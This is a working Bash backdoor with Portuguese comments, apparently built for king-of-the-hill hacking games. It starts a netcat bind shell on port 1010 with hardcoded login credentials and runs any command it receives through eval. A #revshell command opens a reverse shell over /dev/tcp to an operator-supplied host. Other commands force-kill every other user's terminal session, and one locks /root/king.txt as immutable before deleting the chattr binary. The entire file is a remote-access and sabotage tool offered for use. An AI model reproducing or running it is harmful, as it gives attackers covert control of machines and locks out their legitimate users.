#!/bin/bash

# DETREW - MACHINE (Bash Version)
# Configurações
SERVER_HOST="0.0.0.0"
SERVER_PORT="1010"
USERNAME="Machine"
PASSWORD="sorvete"
BACKDOOR_VERSION="1.0"

# Cores
black='\033[0;90m'
red='\033[0;91m'
green='\033[0;92m'
yellow='\033[0;93m'
blue='\033[0;94m'
purple='\033[0;95m'
cyan='\033[0;96m'
white='\033[0;97m'
off='\033[0m'

# Banner
banner_reaper() {
    echo -e "${red}"
    echo " ▄               ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ "
    echo "▐░▌             ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  __________"
    echo "▐░▌             ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀  |  __  __  |"
    echo "▐░▌             ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |"
    echo "▐░▌ ▄▄▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |"
    echo "▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |__||__| |"
    echo "▐░▌ ▀▀▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      |  __  __()|"
    echo "▐░▌             ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌      | |  ||  | |"
    echo "▐░█▄▄▄▄▄▄▄▄▄    ▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌      | |  ||  | |"
    echo "▐░░░░░░░░░░░▌   ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌      | |__||__| |"
    echo " ▀▀▀▀▀▀▀▀▀▀▀     ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       |__________|"
    echo -e "${purple}[https://github.com/Macchimne] and [https://github.com/Detrew]${off}     ${green}[Backdoor]${off}"
    echo -e "${off}"
}

# Verificar se o arquivo king.txt existe
check_king() {
    local diretorios=("/root" "/root/king.txt" "/home/root/king.txt")
    local arquivo="king.txt"
    
    for diretorio in "${diretorios[@]}"; do
        if [[ -f "$diretorio" && -s "$diretorio" ]]; then
            echo "O king.txt foi encontrado em: $diretorio"
            return 0
        fi
    done
    
    if [[ -f "king.txt" && -s "king.txt" ]]; then
        echo "o king.txt pode facilmente ser alterado usando o comando #getking"
    else
        echo "o king.txt já foi alterado"
    fi
}

# Comando getking
get_king() {
    echo "Macchine" > /root/king.txt
    chattr +i /root/king.txt 2>/dev/null
    rm -f /usr/bin/chattr 2>/dev/null
    echo "Sua coroação foi feita com sucesso :)"
}

# Informações do sistema
show_info() {
    hostname=$(hostname)
    kernel=$(uname -r)
    architecture=$(uname -m)
    os=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
    
    echo -e "    ╔═══════════════════════[System Information]══════════════════════╗"
    echo -e "     ${white}Nome:${green} $hostname ${off}"
    echo -e "     ${white}Kernel:${green} $kernel ${off}"
    echo -e "     ${white}Arquitetura:${green} $architecture ${off}"
    echo -e "     ${white}SO:${green} $os ${off}"
    echo -e "    ╚═════════════════════════════════════════════════════════════════╝"
}

# Ajuda
show_help() {
    echo -e "    ${off}"
    echo -e "    ╔═══════════════════[help]═════════════════════╗"
    echo -e "     ${blue}#exit${off}: Fecha a sessão do alvo"
    echo -e "     ${blue}#revshell${off}: Faz uma shell-Reversa"
    echo -e "     ${blue}#kill${off}: Chutar todos com tty :)"
    echo -e "     ${blue}#info${off}: Machine info"
    echo -e "     ${blue}#cat${off}: gatos para todos com tty"
    echo -e "     ${blue}#help${off}: Manual de ajuda"
    echo -e "     ${blue}#getking${off}: Obter privilégios de king"
    echo -e "    ╚═════════════════════════════════════════════╝"
    echo -e ""
}

# Função para matar outras sessões
kill_sessions() {
    my_tty=$(tty | cut -d'/' -f4)
    for session in $(seq 1 40); do
        if [[ "$session" != "$my_tty" ]]; then
            echo "Você foi desconectado pelo administrador" > /dev/pts/$session 2>/dev/null
            pkill -9 -t pts/$session 2>/dev/null
        fi
    done
    echo -e "[${green}Killed Shells${off}]"
}

# Função principal para lidar com o cliente
handle_client() {
    exec 3<>/dev/tcp/$1/$2
    
    if [[ $? -ne 0 ]]; then
        echo "Falha ao conectar"
        return 1
    fi
    
    # Autenticação
    echo -e "[Login]: " >&3
    read -u3 username
    echo -e "[Password]: " >&3
    read -u3 password
    
    if [[ "$username" == "$USERNAME" && "$password" == "$PASSWORD" ]]; then
        clear >&3
        banner_reaper >&3
        echo -e "${green}[*]${off} Bem-Vindo" >&3
        echo -e "${green}[+]${off} Backdoor versão: $BACKDOOR_VERSION" >&3
        echo -e "${green}[+]${off} Use #help para ver os comandos" >&3
        echo -e "${red}[+]${yellow} Este é um shell de ligação para ter um shell reverso Use o comando ${green}#revshell" >&3
        echo -e "${off}" >&3
        
        while true; do
            echo -e "\n[${red}$username${off}@${red}$(hostname)${off}]:~# " >&3
            read -u3 cmd
            
            case "$cmd" in
                "#revshell")
                    echo -e "[${green}ip${off}]: " >&3
                    read -u3 ip_rev
                    echo -e "[${green}port${off}]: " >&3
                    read -u3 port_rev
                    bash -c "bash -i >& /dev/tcp/$ip_rev/$port_rev 0>&1" 2>/dev/null &
                    echo -e "[${green}Reverse Shell Send${off}]" >&3
                    ;;
                "#kill")
                    kill_sessions >&3
                    ;;
                "#info")
                    show_info >&3
                    ;;
                "#help")
                    show_help >&3
                    ;;
                "#getking")
                    get_king >&3
                    ;;
                "#exit")
                    break
                    ;;
                *)
                    output=$(eval "$cmd" 2>&1)
                    echo "$output" >&3
                    ;;
            esac
        done
    else
        echo -e "\n[${red}\o/ Wrong Username or Password${off}]\n" >&3
    fi
    
    exec 3>&-
}

# Iniciar servidor
start_server() {
    echo "[+] Iniciando servidor backdoor em $SERVER_HOST:$SERVER_PORT"
    
    # Usando netcat para escutar na porta
    while true; do
        nc -l -p $SERVER_PORT -c "
            echo -e '[Login]: '
            read username
            echo -e '[Password]: '
            read password
            
            if [[ '$username' == '$USERNAME' && '$password' == '$PASSWORD' ]]; then
                clear
                $(declare -f banner_reaper)
                banner_reaper
                echo -e '${green}[*]${off} Bem-Vindo'
                echo -e '${green}[+]${off} Backdoor versão: $BACKDOOR_VERSION'
                echo -e '${green}[+]${off} Use #help para ver os comandos'
                
                while true; do
                    echo -e '\n[${red}$username${off}@${red}$(hostname)${off}]:~# '
                    read cmd
                    
                    case \"\$cmd\" in
                        '#revshell')
                            echo -e '[${green}ip${off}]: '
                            read ip_rev
                            echo -e '[${green}port${off}]: '
                            read port_rev
                            bash -c \"bash -i >& /dev/tcp/\$ip_rev/\$port_rev 0>&1\" 2>/dev/null &
                            echo -e '[${green}Reverse Shell Send${off}]'
                            ;;
                        '#kill')
                            $(declare -f kill_sessions)
                            kill_sessions
                            ;;
                        '#info')
                            $(declare -f show_info)
                            show_info
                            ;;
                        '#help')
                            $(declare -f show_help)
                            show_help
                            ;;
                        '#getking')
                            $(declare -f get_king)
                            get_king
                            ;;
                        '#exit')
                            exit 0
                            ;;
                        *)
                            output=\$(eval \"\$cmd\" 2>&1)
                            echo \"\$output\"
                            ;;
                    esac
                done
            else
                echo -e '\n[${red}\o/ Wrong Username or Password${off}]\n'
                exit 1
            fi
        "
    done
}

# Menu principal
case "${1:-}" in
    "-c" | "--connect")
        if [[ $# -lt 3 ]]; then
            echo "Uso: $0 -c <IP> <PORTA>"
            exit 1
        fi
        handle_client "$2" "$3"
        ;;
    "-s" | "--server")
        check_king
        start_server
        ;;
    *)
        echo "Uso: $0 [OPÇÃO]"
        echo "Opções:"
        echo "  -c, --connect <IP> <PORTA>  Conectar como cliente"
        echo "  -s, --server                Iniciar como servidor"
        ;;
esac
